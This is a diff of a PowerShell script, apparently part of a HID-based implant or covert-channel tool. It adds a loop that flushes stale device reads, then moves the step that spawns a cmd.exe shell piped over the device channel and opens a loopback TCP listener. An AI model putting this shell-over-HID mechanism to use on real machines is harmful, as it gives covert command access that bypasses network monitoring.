@@ -225,14 +225,6 @@ $Proxy = {
 	try {
 		$conns=New-Object HashTable[] 256
 
-		# Spawn a command prompt on channel 1
-		$cmd = spawn "cmd.exe" "/c cmd.exe /k 2>&1 "
-		$conns[1] = OpenChannel 1 $cmd.StandardOutput.BaseStream $cmd.StandardInput.BaseStream
-
-		$TcpListener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Loopback, 65535)
-		$TcpListener.Start()
-		$ListenerTask = $TcpListener.BeginAcceptTcpClient($null, $null)
-
 		## define two device read buffers, and alternate between them when reading
 		## from the HID. This serves two purposes:
 		## 1. It allows us to begin the read immediately the previous one finishes
@@ -246,6 +238,25 @@ $Proxy = {
 		$DeviceBuff[$db] = New-Object Byte[] ($M+1)
 		$DeviceBuff[!$db] = New-Object Byte[] ($M+1)
 		$DeviceReadTask = $device.BeginRead($DeviceBuff[$db], 0, ($M+1), $null, $null)
+
+		# Purge any unread data from the stream
+		$sw = [Diagnostics.Stopwatch]::StartNew()
+		while ($sw.Elapsed.TotalSeconds -lt 2) {
+			if ($DeviceReadTask.IsCompleted) {
+				$l = $device.EndRead($DeviceReadTask)
+				$DeviceReadTask = $device.BeginRead($DeviceBuff[$db], 0, ($M+1), $null, $null)
+			} else {
+				Start-Sleep -m 10
+			}
+		}
+
+		# Spawn a command prompt on channel 1
+		$cmd = spawn "cmd.exe" "/c cmd.exe /k 2>&1 "
+		$conns[1] = OpenChannel 1 $cmd.StandardOutput.BaseStream $cmd.StandardInput.BaseStream
+
+		$TcpListener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Loopback, 65535)
+		$TcpListener.Start()
+		$ListenerTask = $TcpListener.BeginAcceptTcpClient($null, $null)
 
 		[System.Console]::WriteLine("Entering proxy loop")
 		while ($true) {
